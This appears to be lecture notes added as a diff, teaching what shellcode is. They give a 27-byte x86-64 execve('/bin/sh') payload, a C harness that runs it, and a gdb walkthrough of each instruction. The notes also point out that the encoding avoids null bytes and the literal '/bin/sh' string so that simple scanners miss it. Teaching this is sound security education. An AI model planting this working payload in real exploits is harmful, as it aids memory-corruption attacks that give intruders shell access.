@@ -1,0 +1,297 @@
+------------------------[ Shell code ]------------------------
+
+Attackers typically don't start with access to the compiler build
+chain on your system or to its standard libraries. However, software
+vulnerabilities occasionally give them the opportunity to inject and
+run some binary code snippets on your system, supplied via a buffer
+overflow or some other memory corruption.
+
+A binary code snippet that---when your program is somehow tricked 
+into running it---gives the attacker access to a command shell,
+is called "shellcode". It usually combines one or more system calls.
+
+There's a simple way of testing what these code snippets from a C
+program: take the snippet as a string of bytes, copy them to an
+executable memory region, and then JMP or CALL to the address where
+they had been copied. The binary code will execute, and will
+give you shell---from a program whose code looks nothing like
+starting a new process or executing the shell like "/bin/sh"
+or "/bin/bash".
+
+
+sergey@babylon1:~$ cat sh1.c
+#include <stdio.h>
+#include <string.h>
+
+const char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+int main()
+{
+    printf("len:%d bytes\n", strlen(code));
+    (*(void(*)()) code)();
+    return 0;
+}
+
+sergey@babylon1:~$ gcc -g -o sh1 sh1.c
+sh1.c: In function ‘main’:
+sh1.c:8:18: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t {aka long unsigned int}’ [-Wformat=]
+     printf("len:%d bytes\n", strlen(code));
+                 ~^
+                 %ld
+
+
+
+sergey@babylon1:~$ /bin/sh
+sh-4.4$ exit
+exit
+
+// This actually works to invoke a shell via execve():
+
+sergey@babylon1:~$ ./sh1
+len:27 bytes
+sh-4.4$ id
+uid=33410(sergey) gid=168108(thayerusers) groups=168108(thayerusers),10001(domain users),369992(kite_users),502784(cosc.69.16.01-wi22-admin),534394(thayerpapercut)
+sh-4.4$ exit 
+exit
+
+// ..which is exactly how /bin/sh would be invoked from the command prompt:
+
+sergey@babylon1:~$ /bin/sh
+sh-4.4$ id
+uid=33410(sergey) gid=168108(thayerusers) groups=168108(thayerusers),10001(domain users),369992(kite_users),502784(cosc.69.16.01-wi22-admin),534394(thayerpapercut)
+sh-4.4$ exit
+exit
+
+// So let's look at the code.
+
+sergey@babylon1:~$ gdb ./sh1 
+
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./sh1...done.
+
+(gdb) b main
+Breakpoint 1 at 0x64e: file sh1.c, line 8.
+
+(gdb) r
+Starting program: /thayerfs/home/sergey/sh1 
+
+Breakpoint 1, main () at sh1.c:8
+8	    printf("len:%d bytes\n", strlen(code));
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x000055555555464a <+0>:	push   %rbp
+   0x000055555555464b <+1>:	mov    %rsp,%rbp
+=> 0x000055555555464e <+4>:	mov    $0x1b,%esi
+   0x0000555555554653 <+9>:	lea    0xd2(%rip),%rdi        # 0x55555555472c
+   0x000055555555465a <+16>:	mov    $0x0,%eax
+   0x000055555555465f <+21>:	callq  0x555555554520 <printf@plt>
+   0x0000555555554664 <+26>:	lea    0xa5(%rip),%rdx        # 0x555555554710 <code>
+   0x000055555555466b <+33>:	mov    $0x0,%eax
+   0x0000555555554670 <+38>:	callq  *%rdx
+   0x0000555555554672 <+40>:	mov    $0x0,%eax
+   0x0000555555554677 <+45>:	pop    %rbp
+   0x0000555555554678 <+46>:	retq   
+End of assembler dump.
+
+(gdb) disas code
+Dump of assembler code for function code:
+   0x0000555555554710 <+0>:	xor    %eax,%eax
+   0x0000555555554712 <+2>:	movabs $0xff978cd091969dd1,%rbx  // what is this?
+   0x000055555555471c <+12>:	neg    %rbx
+   0x000055555555471f <+15>:	push   %rbx
+   0x0000555555554720 <+16>:	push   %rsp
+   0x0000555555554721 <+17>:	pop    %rdi
+   0x0000555555554722 <+18>:	cltd   
+   0x0000555555554723 <+19>:	push   %rdx
+   0x0000555555554724 <+20>:	push   %rdi
+   0x0000555555554725 <+21>:	push   %rsp
+   0x0000555555554726 <+22>:	pop    %rsi
+   0x0000555555554727 <+23>:	mov    $0x3b,%al
+   0x0000555555554729 <+25>:	syscall 
+   0x000055555555472b <+27>:	add    %ch,0x6e(%rbp,%riz,2)
+End of assembler dump.
+
+// ...we'll find out by single-stepping instructions
+
+(gdb) b *0x000055555555471c
+Breakpoint 2 at 0x55555555471c
+
+(gdb) c
+Continuing.
+len:27 bytes
+
+Breakpoint 2, 0x000055555555471c in code ()
+
+// Loading this 8-byte value into rbx
+
+(gdb) i r rbx
+rbx            0xff978cd091969dd1	-29400045130965551
+
+// ...and bitwise-negating it:
+
+(gdb) si
+0x000055555555471f in code ()
+
+// The result looks suspiciously like the "/bin/sh\0" string!
+
+(gdb) i r rbx
+rbx            0x68732f6e69622f	29400045130965551
+
+// ...and now it is pushed out to the stack and pointed to by RSP:
+
+(gdb) si
+0x0000555555554720 in code ()
+
+(gdb) i r rsp
+rsp            0x7fffffffe550	0x7fffffffe550
+
+(gdb) x/8c 0x7fffffffe550
+0x7fffffffe550:	47 '/'	98 'b'	105 'i'	110 'n'	47 '/'	115 's'	104 'h'	0 '\000'
+
+(gdb) x/s 0x7fffffffe550
+0x7fffffffe550:	"/bin/sh"
+
+(gdb) disas
+Dump of assembler code for function code:
+   0x0000555555554710 <+0>:	xor    %eax,%eax
+   0x0000555555554712 <+2>:	movabs $0xff978cd091969dd1,%rbx
+   0x000055555555471c <+12>:	neg    %rbx
+   0x000055555555471f <+15>:	push   %rbx
+=> 0x0000555555554720 <+16>:	push   %rsp
+   0x0000555555554721 <+17>:	pop    %rdi
+   0x0000555555554722 <+18>:	cltd   
+   0x0000555555554723 <+19>:	push   %rdx
+   0x0000555555554724 <+20>:	push   %rdi
+   0x0000555555554725 <+21>:	push   %rsp
+   0x0000555555554726 <+22>:	pop    %rsi
+   0x0000555555554727 <+23>:	mov    $0x3b,%al
+   0x0000555555554729 <+25>:	syscall 
+   0x000055555555472b <+27>:	add    %ch,0x6e(%rbp,%riz,2)
+End of assembler dump.
+
+// About to execute the "push RSP":
+
+(gdb) si
+0x0000555555554721 in code ()
+
+// So now RSP is pushed to the stack...
+
+(gdb) i r rsp 
+rsp            0x7fffffffe548	0x7fffffffe548
+
+// ... and will be popped into RDI next, preparing the argv[0] argument for execve()
+
+(gdb) si
+0x0000555555554722 in code ()
+(gdb) i r rsp rdi
+rsp            0x7fffffffe550	0x7fffffffe550
+rdi            0x7fffffffe550	140737488348496
+
+// We are about to execute the CTLD instruction:
+
+(gdb) i r rax rdx 
+rax            0x0	0
+rdx            0x555555554710	93824992233232
+
+(gdb) si
+0x0000555555554723 in code ()
+
+// ...and now we did it. RAX's sign bit (0) has been spread through RDX,
+//     effectively zeroing it:
+
+(gdb) i r rax rdx 
+rax            0x0	0
+rdx            0x0	0
+
+// Now we are preparing the char* argv[] argument for execve:
+
+(gdb) si
+0x0000555555554724 in code ()
+
+(gdb) i r rsp
+rsp            0x7fffffffe548	0x7fffffffe548
+(gdb) si
+0x0000555555554725 in code ()
+(gdb) i r rsp
+rsp            0x7fffffffe540	0x7fffffffe540
+(gdb) si
+0x0000555555554726 in code ()
+(gdb) i r rsp
+rsp            0x7fffffffe538	0x7fffffffe538
+(gdb) i r rsp rsi
+rsp            0x7fffffffe538	0x7fffffffe538
+rsi            0x555555756260	93824994337376
+(gdb) si
+0x0000555555554727 in code ()
+(gdb) i r rsp rsi
+rsp            0x7fffffffe540	0x7fffffffe540
+rsi            0x7fffffffe540	140737488348480
+
+// So now RSI, the 2nd execve argument, is pointing to the array
+//  of two string pointers on the stack, one to "/bin/sh" previously
+//  pushed onto the stack from RBX, and the other one a NULL pointer.
+
+// Finally, we load the code for the execve syscall into RAX:
+
+(gdb) i r rax
+rax            0x0	0
+(gdb) si
+0x0000555555554729 in code ()
+(gdb) i r rax
+rax            0x3b	59
+
+// And now we execute execve, and replace the content of the current process'
+//  memory with the shell "/bin/sh", which happens to be "bash":
+
+(gdb) si
+process 34635 is executing new program: /bin/bash
+
+Breakpoint 1, 0x0000555555583db0 in main ()
+(gdb) 
+
+// Finally, note that the actual binary encoding of this shellcode contains
+//   neither any 0x00 bytes, nor the literal byte string "/bin/sh", which
+//   a naive security scanner might look for:
+
+(gdb) disas /r  code
+Dump of assembler code for function code:
+   0x0000555555554710 <+0>:	31 c0	xor    %eax,%eax
+   0x0000555555554712 <+2>:	48 bb d1 9d 96 91 d0 8c 97 ff	movabs $0xff978cd091969dd1,%rbx
+   0x000055555555471c <+12>:	48 f7 db	neg    %rbx
+   0x000055555555471f <+15>:	53	push   %rbx
+   0x0000555555554720 <+16>:	54	push   %rsp
+   0x0000555555554721 <+17>:	5f	pop    %rdi
+   0x0000555555554722 <+18>:	99	cltd   
+   0x0000555555554723 <+19>:	52	push   %rdx
+   0x0000555555554724 <+20>:	57	push   %rdi
+   0x0000555555554725 <+21>:	54	push   %rsp
+   0x0000555555554726 <+22>:	5e	pop    %rsi
+   0x0000555555554727 <+23>:	b0 3b	mov    $0x3b,%al
+   0x0000555555554729 <+25>:	0f 05	syscall 
+   0x000055555555472b <+27>:	00 6c 65 6e	add    %ch,0x6e(%rbp,%riz,2)
+End of assembler dump.
+
+For this and more shellcodes, check out
+
+http://shell-storm.org/shellcode/files/shellcode-806.php
+https://www.exploit-db.com/exploits/47008
+http://shell-storm.org/shellcode/
+https://www.zorinaq.com/papers/shellcode-amd64.html
+
+For the history of shellcode in buffer overflows, see the classic Phrack paper:
+
+http://phrack.org/issues/49/14.html
